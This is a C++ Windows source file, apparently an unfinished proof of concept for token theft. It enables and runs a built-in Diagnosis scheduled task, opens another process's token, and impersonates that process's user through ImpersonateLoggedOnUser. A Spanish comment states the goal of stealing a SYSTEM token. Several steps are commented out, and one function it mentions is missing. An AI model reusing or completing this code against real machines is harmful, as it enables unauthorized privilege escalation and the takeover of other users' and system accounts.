#include <iostream>
#include <windows.h>
#include <iostream>
#include <cstdio>
#include <tlhelp32.h>
#include <Lmcons.h>
#include <psapi.h>
#include <mstask.h>
#include <taskschd.h>
#include <initguid.h>
#include <ole2.h>
#include <msterr.h>
#include <wchar.h>
#include <stdio.h>
#include <oaidl.h>
#include <ATLComTime.h>

#define _WIN32_DCOM


#include <stdio.h>
#include <comdef.h>
//  Include the task header file.
#include <taskschd.h>
#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "comsupp.lib")
#pragma comment(lib, "Mstask.lib")
#define TASKS_TO_RETRIEVE          5

std::string get_username()
{
	TCHAR username[UNLEN + 1] = { 0 };
	DWORD username_len = UNLEN + 1;
	int res = GetUserName(username, &username_len);
	std::wstring username_w(username);
	std::string username_s(username_w.begin(), username_w.end());
	return username_s;
}


int EnumerateTasks()
{
    //  ------------------------------------------------------
 //  Initialize COM.
    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr))
    {
        printf("\nCoInitializeEx failed: %x", hr);
        return 1;
    }

    //  Set general COM security levels.
    hr = CoInitializeSecurity(
        NULL,
        -1,
        NULL,
        NULL,
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
        RPC_C_IMP_LEVEL_IMPERSONATE,
        NULL,
        0,
        NULL);

    if (FAILED(hr))
    {
        printf("\nCoInitializeSecurity failed: %x", hr);
        CoUninitialize();
        return 1;
    }

    //  ------------------------------------------------------
    //  Create an instance of the Task Service. 
    ITaskService* pService = NULL;
    hr = CoCreateInstance(CLSID_TaskScheduler,
        NULL,
        CLSCTX_INPROC_SERVER,
        IID_ITaskService,
        (void**)&pService);
    if (FAILED(hr))
    {
        printf("Failed to CoCreate an instance of the TaskService class: %x", hr);
        CoUninitialize();
        return 1;
    }

    //  Connect to the task service.
    hr = pService->Connect(_variant_t(), _variant_t(),
        _variant_t(), _variant_t());


    if (FAILED(hr))
    {
        printf("ITaskService::Connect failed: %x", hr);
        pService->Release();
        CoUninitialize();
        return 1;
    }

    //  ------------------------------------------------------
    //  Get the pointer to the root task folder.
    ITaskFolder* pRootFolder = NULL;
    hr = pService->GetFolder(_bstr_t(L"\\Microsoft\\Windows\\Diagnosis"), &pRootFolder);

    pService->Release();
    if (FAILED(hr))
    {
        printf("Cannot get Root Folder pointer: %x", hr);
        CoUninitialize();
        return 1;
    }
	IRegisteredTask* pRegisteredTask = NULL;
	pRootFolder->GetTask(_bstr_t(L"Scheduled"), &pRegisteredTask);
    pRootFolder->Release();

	BSTR taskName = NULL;
	pRegisteredTask->get_Name(&taskName);
    pRegisteredTask->put_Enabled(VARIANT_TRUE);

    ITaskDefinition* ppDefinition = NULL;
    pRegisteredTask->get_Definition(&ppDefinition);


    ITriggerCollection* pTriggerCollection = NULL;
    ppDefinition->get_Triggers(&pTriggerCollection);



	printf("\nTask Name: %S", taskName);
	
    TASK_STATE taskState;
    hr = pRegisteredTask->get_State(&taskState);

    if (SUCCEEDED(hr))
        printf("\n\tState: %d", taskState);
    else
        printf("\n\tCannot get the registered task state: %x", hr);

	IRunningTask* ppRunningTask = NULL;
	pRegisteredTask->RunEx(_variant_t(0), TASK_RUN_USE_SESSION_ID, 1, _bstr_t("ramad"), &ppRunningTask);
    printf("\n\tRun executed\n");

    hr = pRegisteredTask->get_State(&taskState);
    if (SUCCEEDED(hr))
        printf("\n\tState: %d", taskState);
    else
        printf("\n\tCannot get the registered task state: %x", hr);

	/*
    DATE nextrun;
    pRegisteredTask->get_NextRunTime(&nextrun);

    COleDateTime data(nextrun);
    CString strJobStartTime = data.Format(L"%d/%m/%Y %H.%M.%S");
    wprintf(L"strJobStartTime %ws", strJobStartTime);
    */
	SysFreeString(taskName);
	pRegisteredTask->Release();
	CoUninitialize();



	/*
	
    //  -------------------------------------------------------
    //  Get the registered tasks in the folder.
    IRegisteredTaskCollection* pTaskCollection = NULL;
    hr = pRootFolder->GetTasks(NULL, &pTaskCollection);

    pRootFolder->Release();
    if (FAILED(hr))
    {
        printf("Cannot get the registered tasks.: %x", hr);
        CoUninitialize();
        return 1;
    }

    LONG numTasks = 0;
    hr = pTaskCollection->get_Count(&numTasks);

    if (numTasks == 0)
    {
        printf("\nNo Tasks are currently running");
        pTaskCollection->Release();
        CoUninitialize();
        return 1;
    }

    printf("\nNumber of Tasks : %d", numTasks);

    TASK_STATE taskState;

    for (LONG i = 0; i < numTasks; i++)
    {
        IRegisteredTask* pRegisteredTask = NULL;
        hr = pTaskCollection->get_Item(_variant_t(i + 1), &pRegisteredTask);

        if (SUCCEEDED(hr))
        {
            BSTR taskName = NULL;
            hr = pRegisteredTask->get_Name(&taskName);
            if (SUCCEEDED(hr))
            {
                printf("\nTask Name: %S", taskName);
                SysFreeString(taskName);

                hr = pRegisteredTask->get_State(&taskState);
                if (SUCCEEDED(hr))
                    printf("\n\tState: %d", taskState);
                else
                    printf("\n\tCannot get the registered task state: %x", hr);
            }
            else
            {
                printf("\nCannot get the registered task name: %x", hr);
            }
            pRegisteredTask->Release();
        }
        else
        {
            printf("\nCannot get the registered task item at index=%d: %x", i + 1, hr);
        }
    }

    pTaskCollection->Release();
    CoUninitialize();
	*/
    return 0;
	
}



bool Technique1(int pid) {
	// Initialize variables and structures
	HANDLE tokenHandle = NULL;
	DWORD bsize = 1024;
	CHAR buffer[1024] = { 0 };
	HANDLE currentTokenHandle = NULL;



	// Call OpenProcess() to open, print return code and error code
	HANDLE processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, pid);

	if (GetLastError() == NULL) {

		//Get process image name
		QueryFullProcessImageNameA((HMODULE)processHandle, 0, buffer, &bsize);

		if (GetLastError() != NULL)
		{
			printf("[-] Technique1 QueryFullProcessImageNameA Pid %i Error: %i\n", pid, GetLastError());
			SetLastError(NULL);
		}
		printf("[+] Technique1 OpenProcess() %s success!\n", buffer);
	}
	else
	{
		printf("[-] Technique1 OpenProcess() Pid %i Error: %i\n", pid, GetLastError());
		return false;
	}

	// Call OpenProcessToken(), print return code and error code
	bool getToken = OpenProcessToken(processHandle, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &tokenHandle);
	if (getToken != 0)
		printf("[+] Technique1 OpenProcessToken() %s success!\n", buffer);
	else
	{
		printf("[-] Technique1 OpenProcessToken() %s Return Code: %i\n", buffer, getToken);
		printf("[-] Technique1 OpenProcessToken() %s Error: %i\n", buffer, GetLastError());
		CloseHandle(processHandle);
		return false;
	}

	// Impersonate user in a thread
	bool impersonateUser = ImpersonateLoggedOnUser(tokenHandle);
	if (GetLastError() == NULL)
	{
		printf("[+] Technique1 ImpersonatedLoggedOnUser() success!\n");
		printf("[+] Current user is: %s\n", (get_username()).c_str());

	}
	else
	{
		printf("[-] Technique1 ImpersonatedLoggedOnUser() Return Code: %i\n", getToken);
		printf("[-] Technique1 ImpersonatedLoggedOnUser() Error: %i\n", GetLastError());
		CloseHandle(processHandle);
		CloseHandle(tokenHandle);
		return false;
	}

	CloseHandle(processHandle);
	CloseHandle(tokenHandle);
	return true;
}

int main(int argc, char** argv)
{
	SECURITY_QUALITY_OF_SERVICE sqos = {};
	sqos.Length = sizeof(sqos);
	sqos.ImpersonationLevel = SecurityImpersonation;
	//sqos.ImpersonationLevel = SecurityIdentification;
	DWORD bsize = 1024;
	CHAR buffer[1024];
	HANDLE currentTokenHandle = NULL;
	HANDLE TokenHandle = NULL;

	// Grab PID from command line argument
	char* pid_c = argv[1];
	DWORD PID = atoi(pid_c);

	char* pid_c2 = argv[2];
	DWORD PID2 = atoi(pid_c2);
    
	EnumerateTasks();
	// Launching target process
	/*
	if (LanchDiagnosisTask())
		wprintf(L"[+]Diagnosis Scheduled Task created!\n");
	else {
		wprintf(L"[-]LanchDiagnosisTask Failed\n");
		exit(1);
	}
	*/

	/*
	Technique1(PID);
	getchar();
	Technique1(PID2);
	getchar();
	*/

	/*
ejecuta tarea
suspoende el proceso 
roba el token 
roba el token de un system

	*/

}

